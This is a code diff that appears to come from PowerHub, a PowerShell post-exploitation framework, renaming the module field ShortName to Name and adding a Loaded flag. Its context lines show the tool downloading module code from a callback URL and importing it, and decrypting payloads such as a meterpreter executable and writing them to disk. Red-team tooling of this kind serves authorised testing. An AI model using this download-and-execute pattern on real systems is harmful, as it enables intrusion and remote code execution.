@@ -96,7 +96,7 @@ Lists all modules that are available via the hub.
 
 #>
     # $Modules | Out-String
-    $Modules | Format-Table -AutoSize -Property N,Type,ShortName,Code
+    $Modules | Format-Table -AutoSize -Property N,Type,Name,Loaded
 }
 
 function Load-HubModule {
@@ -117,7 +117,7 @@ Load-HubModule loads a module.
 .PARAMETER Expression
 
 A regular expression. PowerHub will then load all modules that have a matching
-ShortName.
+Name.
 
 Alternatively, you can use the number of the module, separated by commas. Can
 contain a range such as "1,4-8". Try a leading zero in case it is not working.
@@ -172,7 +172,7 @@ Use the '-Verbose' option to print detailed information.
     if ($Expression -match "^[0-9-,]+$") {
         $indices = Convert-IntStringToArray($Expression)
     } else {
-        $indices = $Modules | Where { $_.shortname -match $Expression } | % {$_.N}
+        $indices = $Modules | Where { $_.Name -match $Expression } | % {$_.N}
     }
 
     $result = @()
@@ -182,6 +182,7 @@ Use the '-Verbose' option to print detailed information.
             if ($PS_VERSION -eq 2) { $compression = "" }
             $url = "{0}m?m={1}{2}" -f $CALLBACK_URL, $i, $compression
             $Modules[$i].Code = $WebClient.DownloadString($url);
+            $Modules[$i].Loaded = $True
             Import-HubModule $Modules[$i]
         }
         $result += $Modules[$i]
@@ -301,9 +302,9 @@ Load the exe module with the name 'meterpreter.exe' in memory and save it to dis
         $code = Decrypt-Code $code $KEY
         $code = Unzip-Code $code
         if ($Directory) {
-            $Filename = "$Directory/$($m.ShortName)"
+            $Filename = "$Directory/$($m.Name)"
         } else {
-            $Filename = $m.ShortName
+            $Filename = $m.Name
         }
         $code | Set-Content "$Filename" -Encoding Byte
         $Filename
